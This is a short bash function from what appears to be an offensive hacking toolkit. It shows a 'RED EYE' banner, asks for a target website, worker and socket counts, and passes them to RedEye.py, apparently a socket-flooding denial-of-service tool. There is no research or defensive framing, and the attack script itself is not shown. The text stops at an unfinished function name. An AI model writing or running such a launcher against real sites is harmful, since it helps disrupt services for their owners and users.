RedEye()
{
    clear
    echo -e " ${BLUE} "
    echo -e " ${WHITE}
             ██████╗ ███████╗██████╗     ███████╗██╗   ██╗███████╗
             ██╔══██╗██╔════╝██╔══██╗    ██╔════╝╚██╗ ██╔╝██╔════╝
             ██████╔╝█████╗  ██║  ██║    █████╗   ╚████╔╝ █████╗  
             ██╔══██╗██╔══╝  ██║  ██║    ██╔══╝    ╚██╔╝  ██╔══╝  
             ██║  ██║███████╗██████╔╝    ███████╗   ██║   ███████╗
             ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝   ╚═╝   ╚══════╝

                         CODED BY COLAK 
                  INSTAGRAM : @colak.offical                   
                                                                       
                                                                  ${WHITE}"
echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Web Site ? : "
read host
echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Workers ? [10] : "
read workers
echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Sockets ? [500] : "
read socket
python RedEye.py $host -w $workers -s $socket
echo " "
echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
read enter
}

exit_script1()
